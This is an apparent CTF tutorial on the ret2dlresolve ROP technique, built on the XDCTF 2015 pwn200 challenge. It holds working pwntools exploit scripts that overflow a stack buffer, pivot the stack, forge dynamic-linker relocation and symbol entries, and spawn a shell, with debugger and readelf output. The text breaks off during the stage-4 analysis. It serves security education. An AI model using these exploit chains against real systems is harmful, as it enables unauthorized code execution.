# ret2dlresolve

Before learning this ROP exploitation technique, you need to first understand the basic process of dynamic linking and the dynamic linking related structures in ELF files. Readers can refer to the ELF introduction in the executable section. Here we only present the corresponding exploitation methods.

## Principle

In Linux, programs use `_dl_runtime_resolve(link_map_obj, reloc_offset)` to relocate dynamically linked functions. So if we can control the corresponding parameters and the content at their addresses, can we control which function is resolved? The answer is yes. This is the core of the ret2dlresolve attack.

Specifically, the relocation table entries, dynamic symbol table, and dynamic string table used by the dynamic linker when resolving symbol addresses are all indexed from the `.dynamic` section in the target file. So if we can modify some of the content so that the symbol ultimately resolved by the dynamic linker is the symbol we want, then the attack is successful.

### Approach 1 - Directly Control Relocation Table Entry Content

Since the dynamic linker ultimately resolves symbol addresses based on the symbol's name, a very natural idea is to directly modify the dynamic string table `.dynstr`, such as changing a function's corresponding string in the string table to the target function's string. However, the dynamic string table is mapped together with the code and is read-only. Furthermore, similarly, we can find that the dynamic symbol table and relocation table entries are also read-only.

However, if we can control the program's execution flow, we can forge appropriate relocation offsets to achieve the purpose of calling the target function. Nevertheless, this method is rather cumbersome because we not only need to forge relocation table entries, symbol information, and string information, but we also need to ensure that the dynamic linker does not encounter errors during the resolution process.

### Approach 2 - Indirectly Control Relocation Table Entry Content

Since the dynamic linker indexes each target section from the `.dynamic` section, if we can modify the content of the dynamic section, it naturally becomes easy to control the string corresponding to the symbol to be resolved, thereby achieving the purpose of executing the target function.

### Approach 3 - Forge link_map

Since the dynamic linker primarily relies on link_map to query related addresses when resolving symbol addresses, if we can successfully forge link_map, we can control the program to execute the target function.

Below we will use 2015-XDCTF-pwn200 to demonstrate how to use the ret2dlresolve technique on both 32-bit and 64-bit systems.

## 32-bit Examples

### NO RELRO

First, we can compile the corresponding file as follows.

```shell
❯ gcc -fno-stack-protector -m32 -z norelro -no-pie main.c -o main_norelro_32
❯ checksec main_no_relro_32
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/no-relro/main_no_relro_32'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

In this case, modifying `.dynamic` is simpler. We only need to change the string table address in the `.dynamic` section to the address of our forged string table, with the target string at the corresponding position. The specific approach is as follows

1. Modify the string table address in the .dynamic section to the forged address
2. Construct the string table at the forged address, replacing the read string with the system string.
3. Read the /bin/sh string at a specific position.
4. Call the second instruction of read's plt, triggering `_dl_runtime_resolve` for function resolution, thereby executing the system function.

The code is as follows

```python
from pwn import *
# context.log_level="debug"
context.terminal = ["tmux","splitw","-h"]
context.arch="i386"
p = process("./main_no_relro_32")
rop = ROP("./main_no_relro_32")
elf = ELF("./main_no_relro_32")

p.recvuntil('Welcome to XDCTF2015~!\n')

offset = 112
rop.raw(offset*'a')
rop.read(0,0x08049804+4,4) # modify .dynstr pointer in .dynamic section to a specific location
dynstr = elf.get_section_by_name('.dynstr').data()
dynstr = dynstr.replace("read","system")
rop.read(0,0x080498E0,len((dynstr))) # construct a fake dynstr section
rop.read(0,0x080498E0+0x100,len("/bin/sh\x00")) # read /bin/sh\x00
rop.raw(0x08048376) # the second instruction of read@plt 
rop.raw(0xdeadbeef)
rop.raw(0x080498E0+0x100)
# print(rop.dump())
assert(len(rop.chain())<=256)
rop.raw("a"*(256-len(rop.chain())))
p.send(rop.chain())
p.send(p32(0x080498E0))
p.send(dynstr)
p.send("/bin/sh\x00")
p.interactive()
```

The execution result is as follows

```python
❯ python exp-no-relro.py
[+] Starting local process './main_no_relro_32': pid 35093
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/no-relro/main_no_relro_32'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] Loaded 10 cached gadgets for './main_no_relro_32'
[*] Switching to interactive mode
$ ls
exp-no-relro.py  main_no_relro_32
```

### Partial RELRO

First we can compile the source file main.c to obtain the binary, with Canary protection disabled.

```shell
❯ gcc -fno-stack-protector -m32 -z relro -z lazy -no-pie ../../main.c -o main_partial_relro_32
❯ checksec main_partial_relro_32
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/parti
al-relro/main_partial_relro_32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

In this case, the .dynamic section in the ELF file becomes read-only, so we can call the target function by forging relocation table entries.

In the following explanation, this article will use the technique in two different ways.

1. Use the technique through manual forgery to obtain a shell. Although this method is more cumbersome, it allows for a thorough understanding of the ret2dlresolve principle.
2. Use tools to implement the attack to obtain a shell. While this method is simpler, we should still fully understand the underlying principles and not just know how to use the tools.

#### Manual Forgery

For this challenge, we do not consider the case where libc is available. Through analysis, we can find that the program has a very obvious stack overflow vulnerability, with an offset of 112 from the buffer to the return address.

```asm
gef➤  pattern create 200
[+] Generating a pattern of 200 bytes
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
[+] Saved as '$_gef0'
gef➤  r
Starting program: /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32
Welcome to XDCTF2015~!
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab

Program received signal SIGSEGV, Segmentation fault.
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xc9
$ebx   : 0x62616162 ("baab"?)
$ecx   : 0xffffcddc  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"
$edx   : 0x100
$esp   : 0xffffce50  →  "eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqa[...]"
$ebp   : 0x62616163 ("caab"?)
$esi   : 0xf7fb0000  →  0x001d7d6c
$edi   : 0xffffcec0  →  0x00000001
$eip   : 0x62616164 ("daab"?)
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
───────────────────────────────────────────────────────────────────────────── stack ────
0xffffce50│+0x0000: "eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqa[...]"	 ← $esp
0xffffce54│+0x0004: "faabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabra[...]"
0xffffce58│+0x0008: "gaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsa[...]"
0xffffce5c│+0x000c: "haabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabta[...]"
0xffffce60│+0x0010: "iaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabua[...]"
0xffffce64│+0x0014: "jaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabva[...]"
0xffffce68│+0x0018: "kaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwa[...]"
0xffffce6c│+0x001c: "laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxa[...]"
─────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x62616164
─────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "main_partial_re", stopped 0x62616164 in ?? (), reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────── trace ────
────────────────────────────────────────────────────────────────────────────────────────
0x62616164 in ?? ()
gef➤  pattern search 0x62616164
[+] Searching '0x62616164'
[+] Found at offset 112 (little-endian search) likely
```

In each of the following stages, we will progressively deepen our understanding of how to construct the payload.

##### stage 1

In this stage, our goal is relatively simple: to control the program to directly execute the write function. In a stack overflow scenario, we can actually directly control the return address to make the program execute the write function. However, here we use a slightly more complex approach: first use stack pivoting to migrate the stack to the bss segment, then control the write function. Therefore, this stage mainly consists of two steps

1. Pivot the stack to the bss segment.
2. Execute the write function through its plt entry to output the corresponding string.

Here we use the ROP module from pwntools. The specific code is as follows

```python
from pwn import *
elf = ELF('./main_partial_relro_32')
r = process('./main_partial_relro_32')
rop = ROP('./main_partial_relro_32')

offset = 112
bss_addr = elf.bss()

r.recvuntil('Welcome to XDCTF2015~!\n')

# stack privot to bss segment, set esp = base_stage
stack_size = 0x800 # new stack size is 0x800
base_stage = bss_addr + stack_size
rop.raw('a' * offset) # padding
rop.read(0, base_stage, 100) # read 100 byte to base_stage
rop.migrate(base_stage)
r.sendline(rop.chain())

# write "/bin/sh"
rop = ROP('./main_partial_relro_32')
sh = "/bin/sh"
rop.write(1, base_stage + 80, len(sh))
rop.raw('a' * (80 - len(rop.chain())))
rop.raw(sh)
rop.raw('a' * (100 - len(rop.chain())))
r.sendline(rop.chain())

r.interactive()
```

The result is as follows

```shell
❯ python stage1.py
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './main_partial_relro_32': pid 25112
[*] Loaded 10 cached gadgets for './main_partial_relro_32'
[*] Switching to interactive mode
/bin/sh[*] Got EOF while reading in interactive
```

##### stage 2

In this stage, we will further leverage knowledge related to `_dl_runtime_resolve` to control the program to execute the write function.

1. Pivot the stack to the bss segment.
2. Control the program to directly execute the relevant instructions in plt0, namely push linkmap and jump to the `_dl_runtime_resolve` function. At this point, we also need to provide the offset of the write relocation entry in the got table. Here, we can directly use the offset provided in write's plt, which is 0x20 as given at address 0x080483C6. In fact, we can also jump to address 0x080483C6 to use the existing instructions to provide the write function's offset and jump to plt0.

```
.plt:08048370 ; ===========================================================================
.plt:08048370
.plt:08048370 ; Segment type: Pure code
.plt:08048370 ; Segment permissions: Read/Execute
.plt:08048370 _plt            segment para public 'CODE' use32
.plt:08048370                 assume cs:_plt
.plt:08048370                 ;org 8048370h
.plt:08048370                 assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing
.plt:08048370
.plt:08048370 ; =============== S U B R O U T I N E =======================================
.plt:08048370
.plt:08048370
.plt:08048370 sub_8048370     proc near               ; CODE XREF: .plt:0804838B↓j
.plt:08048370                                         ; .plt:0804839B↓j ...
.plt:08048370 ; __unwind {
.plt:08048370                 push    ds:dword_804A004
.plt:08048376                 jmp     ds:dword_804A008
.plt:08048376 sub_8048370     endp
.plt:08048376
...
.plt:080483C0 ; =============== S U B R O U T I N E =======================================
.plt:080483C0
.plt:080483C0 ; Attributes: thunk
.plt:080483C0
.plt:080483C0 ; ssize_t write(int fd, const void *buf, size_t n)
.plt:080483C0 _write          proc near               ; CODE XREF: main+8A↓p
.plt:080483C0
.plt:080483C0 fd              = dword ptr  4
.plt:080483C0 buf             = dword ptr  8
.plt:080483C0 n               = dword ptr  0Ch
.plt:080483C0
.plt:080483C0                 jmp     ds:off_804A01C
.plt:080483C0 _write          endp
.plt:080483C0
.plt:080483C6 ; ---------------------------------------------------------------------------
.plt:080483C6                 push    20h ; ' '
.plt:080483CB                 jmp     sub_8048370
```

The specific code is as follows

```python
from pwn import *
elf = ELF('./main_partial_relro_32')
r = process('./main_partial_relro_32')
rop = ROP('./main_partial_relro_32')

offset = 112
bss_addr = elf.bss()

r.recvuntil('Welcome to XDCTF2015~!\n')

# stack privot to bss segment, set esp = base_stage
stack_size = 0x800 # new stack size is 0x800
base_stage = bss_addr + stack_size
rop.raw('a' * offset) # padding
rop.read(0, base_stage, 100) # read 100 byte to base_stage
rop.migrate(base_stage)
r.sendline(rop.chain())

# write "/bin/sh"
rop = ROP('./main_partial_relro_32')
plt0 = elf.get_section_by_name('.plt').header.sh_addr
jmprel_data = elf.get_section_by_name('.rel.plt').data()
writegot = elf.got["write"]
write_reloc_offset = jmprel_data.find(p32(writegot,endian="little"))
print(write_reloc_offset)
rop.raw(plt0)
rop.raw(write_reloc_offset)
# fake ret addr of write
rop.raw('bbbb')
# fake write args, write(1, base_stage+80, sh)
rop.raw(1)  
rop.raw(base_stage + 80)
sh = "/bin/sh"
rop.raw(len(sh))
rop.raw('a' * (80 - len(rop.chain())))
rop.raw(sh)
rop.raw('a' * (100 - len(rop.chain())))

r.sendline(rop.chain())
r.interactive()
```

The result is as follows — it still outputs the string corresponding to sh.

```shell
❯ python stage2.py
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './main_partial_relro_32': pid 25131
[*] Loaded 10 cached gadgets for './main_partial_relro_32'
32
[*] Switching to interactive mode
/bin/sh[*] Got EOF while reading in interactive
```

##### stage 3

This time, we again control the reloc_offset parameter in the `_dl_runtime_resolve` function, but this time we make it point to our forged write relocation entry.

Since pwntools does not natively support retrieving relocation table entry information, let's take a manual look

```shell
❯ readelf -r main_partial_relro_32

Relocation section '.rel.dyn' at offset 0x30c contains 3 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
08049ff4  00000306 R_386_GLOB_DAT    00000000   __gmon_start__
08049ff8  00000706 R_386_GLOB_DAT    00000000   stdin@GLIBC_2.0
08049ffc  00000806 R_386_GLOB_DAT    00000000   stdout@GLIBC_2.0

Relocation section '.rel.plt' at offset 0x324 contains 5 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
0804a00c  00000107 R_386_JUMP_SLOT   00000000   setbuf@GLIBC_2.0
0804a010  00000207 R_386_JUMP_SLOT   00000000   read@GLIBC_2.0
0804a014  00000407 R_386_JUMP_SLOT   00000000   strlen@GLIBC_2.0
0804a018  00000507 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0
0804a01c  00000607 R_386_JUMP_SLOT   00000000   write@GLIBC_2.0
```

We can see that write's relocation entry has r_offset=0x0804a01c, r_info=0x00000607. The specific code is as follows

```python
from pwn import *
elf = ELF('./main_partial_relro_32')
r = process('./main_partial_relro_32')
rop = ROP('./main_partial_relro_32')

offset = 112
bss_addr = elf.bss()

r.recvuntil('Welcome to XDCTF2015~!\n')

# stack privot to bss segment, set esp = base_stage
stack_size = 0x800 # new stack size is 0x800
base_stage = bss_addr + stack_size
rop.raw('a' * offset) # padding
rop.read(0, base_stage, 100) # read 100 byte to base_stage
rop.migrate(base_stage)
r.sendline(rop.chain())

# write "/bin/sh"
rop = ROP('./main_partial_relro_32')
plt0 = elf.get_section_by_name('.plt').header.sh_addr
got0 = elf.get_section_by_name('.got').header.sh_addr

rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
# make base_stage+24 ---> fake reloc
write_reloc_offset = base_stage + 24 - rel_plt
write_got = elf.got['write']
r_info = 0x607

rop.raw(plt0)
rop.raw(write_reloc_offset)
# fake ret addr of write
rop.raw('bbbb')
# fake write args, write(1, base_stage+80, sh)
rop.raw(1)  
rop.raw(base_stage + 80)
sh = "/bin/sh"
rop.raw(len(sh))
# construct fake write relocation entry
rop.raw(write_got)
rop.raw(r_info)
rop.raw('a' * (80 - len(rop.chain())))
rop.raw(sh)
rop.raw('a' * (100 - len(rop.chain())))

r.sendline(rop.chain())
r.interactive()
```

This time we forged a write relocation entry at base_stage+24, and it still outputs the corresponding string.

```shell
❯ python stage3.py
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './main_partial_relro_32': pid 24506
[*] Loaded 10 cached gadgets for './main_partial_relro_32'
[*] Switching to interactive mode
/bin/sh[*] Got EOF while reading in interactive
```

##### stage 4

In stage3, we controlled the relocation table entry, but the content of the forged relocation table entry was still identical to write's original relocation table entry.

In this stage, we will construct our own relocation table entry and forge the corresponding symbol. First, from write's relocation table entry r_info=0x607, we can determine that write's corresponding symbol is at index 0x607>>8=0x6 in the symbol table. Therefore, we know that the symbol address corresponding to write is 0x0804822c.

```shell
❯ readelf -x .dynsym main_partial_relro_32

Hex dump of section '.dynsym':
  0x080481cc 00000000 00000000 00000000 00000000 ................
  0x080481dc 33000000 00000000 00000000 12000000 3...............
  0x080481ec 27000000 00000000 00000000 12000000 '...............
  0x080481fc 5c000000 00000000 00000000 20000000 \........... ...
  0x0804820c 20000000 00000000 00000000 12000000  ...............
  0x0804821c 3a000000 00000000 00000000 12000000 :...............
  0x0804822c 4c000000 00000000 00000000 12000000 L...............
  0x0804823c 1a000000 00000000 00000000 11000000 ................
  0x0804824c 2c000000 00000000 00000000 11000000 ,...............
  0x0804825c 0b000000 6c860408 04000000 11001000 ....l...........
```

What is shown here is actually in little-endian format, so we need to manually convert it. Additionally, each symbol occupies 16 bytes.

```python
from pwn import *
elf = ELF('./main_partial_relro_32')
r = process('./main_partial_relro_32')
rop = ROP('./main_partial_relro_32')

offset = 112
bss_addr = elf.bss()

r.recvuntil('Welcome to XDCTF2015~!\n')

# stack privot to bss segment, set esp = base_stage
stack_size = 0x800 # new stack size is 0x800
base_stage = bss_addr + stack_size
rop.raw('a' * offset) # padding
rop.read(0, base_stage, 100) # read 100 byte to base_stage
rop.migrate(base_stage)
r.sendline(rop.chain())


rop = ROP('./main_partial_relro_32')
sh = "/bin/sh"

plt0 = elf.get_section_by_name('.plt').header.sh_addr
rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
dynstr = elf.get_section_by_name('.dynstr').header.sh_addr

# make a fake write symbol at base_stage + 32 + align
fake_sym_addr = base_stage + 32
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf
                )  # since the size of Elf32_Symbol is 0x10
fake_sym_addr = fake_sym_addr + align
index_dynsym = (fake_sym_addr - dynsym) / 0x10  # calculate the dynsym index of write
fake_write_sym = flat([0x4c, 0, 0, 0x12])

# make fake write relocation at base_stage+24
index_offset = base_stage + 24 - rel_plt
write_got = elf.got['write']
r_info = (index_dynsym << 8) | 0x7 # calculate the r_info according to the index of write
fake_write_reloc = flat([write_got, r_info])

# construct rop chain
rop.raw(plt0)
rop.raw(index_offset)
rop.raw('bbbb') # fake ret addr of write
rop.raw(1)
rop.raw(base_stage + 80)
rop.raw(len(sh))
rop.raw(fake_write_reloc)  # fake write reloc
rop.raw('a' * align)  # padding
rop.raw(fake_write_sym)  # fake write symbol
rop.raw('a' * (80 - len(rop.chain())))
rop.raw(sh)
rop.raw('a' * (100 - len(rop.chain())))

r.sendline(rop.chain())
r.interactive()
```

After direct execution, we find it doesn't work

```shell
❯ python stage4.py
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './main_partial_relro_32': pid 27370
[*] Loaded 10 cached gadgets for './main_partial_relro_32'
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
```

We find the program has crashed. Through the coredump, we can see the program crashed in `ld-linux.so.2`.

```assembly
 ► 0xf7f77fed    mov    ebx, dword ptr [edx + 4]
   0xf7f77ff0    test   ebx, ebx
   0xf7f77ff2    mov    ebx, 0
   0xf7f77ff7    cmove  edx, ebx
   0xf7f77ffa    mov    esi, dword ptr gs:[0xc]
   0xf7f78001    test   esi, esi
   0xf7f78003    mov    ebx, 1
   0xf7f78008    jne    0xf7f78078 <0xf7f78078>
    ↓
   0xf7f78078    mov    dword ptr gs:[0x1c], 1
   0xf7f78083    mov    ebx, 5
   0xf7f78088    jmp    0xf7f7800a <0xf7f7800a>
───────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────
00:0000│ esp  0x804a7dc ◂— 0x0
... ↓
02:0008│      0x804a7e4 —▸ 0xf7f90000 ◂— 0x26f34
03:000c│      0x804a7e8 —▸ 0x804826c ◂— add    byte ptr [ecx + ebp*2 + 0x62], ch
04:0010│      0x804a7ec ◂— 0x0
... ↓
07:001c│      0x804a7f8 —▸ 0x804a84c ◂— 0x4c /* 'L' */
─────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────
 ► f 0 f7f77fed
   f 1        0
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 0x8048000  0x804a000 r-xp     2000 0      ./main_partial_relro_32
 0x8049000  0x804b000 rw-p     2000 0      [stack]
 0x804a000  0x804b000 rw-p     1000 1000   ./main_partial_relro_32
0xf7d6b000 0xf7f40000 r-xp   1d5000 0      /lib/i386-linux-gnu/libc.so.6
0xf7f40000 0xf7f41000 ---p     1000 1d5000 /lib/i386-linux-gnu/libc.so.6
0xf7f41000 0xf7f43000 r--p     2000 1d5000 /lib/i386-linux-gnu/libc.so.6
0xf7f43000 0xf7f47000 rw-p     4000 1d7000 /lib/i386-linux-gnu/libc.so.6
0xf7f67000 0xf7f69000 r-xp     2000 0      [vdso]
0xf7f69000 0xf7f90000 r-xp    27000 0      [linker]
0xf7f69000 0xf7f90000 r-xp    27000 0      /lib/ld-linux.so.2
0xf7f90000 0xf7f91000 rw-p     1000 26000  [linker]
0xf7f90000 0xf7f91000 rw-p     1000 26000  /lib/ld-linux.so.2
```

Through reverse engineering ld-linux.so.2 

```c
  if ( v9 )
  {
    v10 = (char *)a1[92] + 16 * (*(_WORD *)(*((_DWORD *)v9 + 1) + 2 * v4) & 0x7FFF);
    if ( !*((_DWORD *)v10 + 1) )
      v10 = 0;
  }
```

and the source code, we can determine the program errors when accessing the version's hash.

```c
        if (l->l_info[VERSYMIDX(DT_VERSYM)] != NULL)
        {
            const ElfW(Half) *vernum =
                (const void *)D_PTR(l, l_info[VERSYMIDX(DT_VERSYM)]);
            ElfW(Half) ndx = vernum[ELFW(R_SYM)(reloc->r_info)] & 0x7fff;
            version = &l->l_versions[ndx];
            if (version->hash == 0)
                version = NULL;
        }
```

Further analysis reveals that because we forged the write function's relocation table entry, the reloc->r_info was set to a relatively large value (since index_dynsym is far from the symbol table). At this point, the value of ndx is unpredictable, and consequently the value of version is also unpredictable, which may lead to unexpected situations.

By analyzing the .dynamic section, we can find that the address of vernum is 0x80482d8.

```
❯ readelf -d main_partial_relro_32

Dynamic section at offset 0xf0c contains 24 entries:
  Tag        Type                         Name/Value
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000c (INIT)                       0x804834c
 0x0000000d (FINI)                       0x8048654
 0x00000019 (INIT_ARRAY)                 0x8049f04
 0x0000001b (INIT_ARRAYSZ)               4 (bytes)
 0x0000001a (FINI_ARRAY)                 0x8049f08
 0x0000001c (FINI_ARRAYSZ)               4 (bytes)
 0x6ffffef5 (GNU_HASH)                   0x80481ac
 0x00000005 (STRTAB)                     0x804826c
 0x00000006 (SYMTAB)                     0x80481cc
 0x0000000a (STRSZ)                      107 (bytes)
 0x0000000b (SYMENT)                     16 (bytes)
 0x00000015 (DEBUG)                      0x0
 0x00000003 (PLTGOT)                     0x804a000
 0x00000002 (PLTRELSZ)                   40 (bytes)
 0x00000014 (PLTREL)                     REL
 0x00000017 (JMPREL)                     0x8048324
 0x00000011 (REL)                        0x804830c
 0x00000012 (RELSZ)                      24 (bytes)
 0x00000013 (RELENT)                     8 (bytes)
 0x6ffffffe (VERNEED)                    0x80482ec
 0x6fffffff (VERNEEDNUM)                 1
 0x6ffffff0 (VERSYM)                     0x80482d8
 0x00000000 (NULL)                       0x0
```

In IDA, we can also see the related information

```assembly
LOAD:080482D8 ; ELF GNU Symbol Version Table
LOAD:080482D8                 dw 0
LOAD:080482DA                 dw 2                    ; setbuf@@GLIBC_2.0
LOAD:080482DC                 dw 2                    ; read@@GLIBC_2.0
LOAD:080482DE                 dw 0                    ; local  symbol: __gmon_start__
LOAD:080482E0                 dw 2                    ; strlen@@GLIBC_2.0
LOAD:080482E2                 dw 2                    ; __libc_start_main@@GLIBC_2.0
LOAD:080482E4                 dw 2                    ; write@@GLIBC_2.0
LOAD:080482E6                 dw 2                    ; stdin@@GLIBC_2.0
LOAD:080482E8                 dw 2                    ; stdout@@GLIBC_2.0
LOAD:080482EA                 dw 1                    ; global symbol: _IO_stdin_used
```

Let's run it again to check the specific value of ndx after forgery

```shell
❯ python stage4.py
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './main_partial_relro_32': pid 27649
[*] Loaded 10 cached gadgets for './main_partial_relro_32'
ndx_addr: 0x80487a8
```

We can see that ndx falls into the `.eh_frame` section.

```assembly
.eh_frame:080487A8                 dw 442Ch
```

Furthermore, the value of ndx is 0x442C. Obviously, it's unclear where this would index to.

```c
        if (l->l_info[VERSYMIDX(DT_VERSYM)] != NULL)
        {
            const ElfW(Half) *vernum =
                (const void *)D_PTR(l, l_info[VERSYMIDX(DT_VERSYM)]);
            ElfW(Half) ndx = vernum[ELFW(R_SYM)(reloc->r_info)] & 0x7fff;
            version = &l->l_versions[ndx];
            if (version->hash == 0)
                version = NULL;
        }
```

Through dynamic debugging, we can find the starting address of l_versions, which contains a total of 3 elements.

```assembly
pwndbg> print *((struct link_map *)0xf7f0d940)
$4 = {
  l_addr = 0, 
  l_name = 0xf7f0dc2c "", 
  l_ld = 0x8049f0c, 
  l_next = 0xf7f0dc30, 
  l_prev = 0x0, 
  l_real = 0xf7f0d940, 
  l_ns = 0, 
  l_libname = 0xf7f0dc20, 
  l_info = {0x0, 0x8049f0c, 0x8049f7c, 0x8049f74, 0x0, 0x8049f4c, 0x8049f54, 0x0, 0x0, 0x0, 0x8049f5c, 0x8049f64, 0x8049f14, 0x8049f1c, 0x0, 0x0, 0x0, 0x8049f94, 0x8049f9c, 0x8049fa4, 0x8049f84, 0x8049f6c, 0x0, 0x8049f8c, 0x0, 0x8049f24, 0x8049f34, 0x8049f2c, 0x8049f3c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8049fb4, 0x8049fac, 0x0 <repeats 13 times>, 0x8049fbc, 0x0 <repeats 25 times>, 0x8049f44}, 
  l_phdr = 0x8048034, 
  l_entry = 134513632, 
  l_phnum = 9, 
  l_ldnum = 0, 
  l_searchlist = {
    r_list = 0xf7edf3e0, 
    r_nlist = 3
  }, 
  l_symbolic_searchlist = {
    r_list = 0xf7f0dc1c, 
    r_nlist = 0
  }, 
  l_loader = 0x0, 
  l_versions = 0xf7edf3f0, 
  l_nversions = 3, 
```

They correspond to respectively 

```assembly
pwndbg> print *((struct r_found_version[3] *)0xf7edf3f0)
$13 = {{
    name = 0x0, 
    hash = 0, 
    hidden = 0, 
    filename = 0x0
  }, {
    name = 0x0, 
    hash = 0, 
    hidden = 0, 
    filename = 0x0
  }, {
    name = 0x80482be "GLIBC_2.0", 
    hash = 225011984, 
    hidden = 0, 
    filename = 0x804826d "libc.so.6"
  }}

```

At this point, the calculated version address is 0xf7f236b0, which is obviously not in the mapped memory region.

```assembly
pwndbg> print /x 0xf7edf3f0+0x442C*16
$16 = 0xf7f236b0
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 0x8048000  0x8049000 r-xp     1000 0      /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32
 0x8049000  0x804a000 r--p     1000 0      /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32
 0x804a000  0x804b000 rw-p     1000 1000   /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32
0xf7ce8000 0xf7ebd000 r-xp   1d5000 0      /lib/i386-linux-gnu/libc-2.27.so
0xf7ebd000 0xf7ebe000 ---p     1000 1d5000 /lib/i386-linux-gnu/libc-2.27.so
0xf7ebe000 0xf7ec0000 r--p     2000 1d5000 /lib/i386-linux-gnu/libc-2.27.so
0xf7ec0000 0xf7ec1000 rw-p     1000 1d7000 /lib/i386-linux-gnu/libc-2.27.so
0xf7ec1000 0xf7ec4000 rw-p     3000 0      
0xf7edf000 0xf7ee1000 rw-p     2000 0      
0xf7ee1000 0xf7ee4000 r--p     3000 0      [vvar]
0xf7ee4000 0xf7ee6000 r-xp     2000 0      [vdso]
0xf7ee6000 0xf7f0c000 r-xp    26000 0      /lib/i386-linux-gnu/ld-2.27.so
0xf7f0c000 0xf7f0d000 r--p     1000 25000  /lib/i386-linux-gnu/ld-2.27.so
0xf7f0d000 0xf7f0e000 rw-p     1000 26000  /lib/i386-linux-gnu/ld-2.27.so
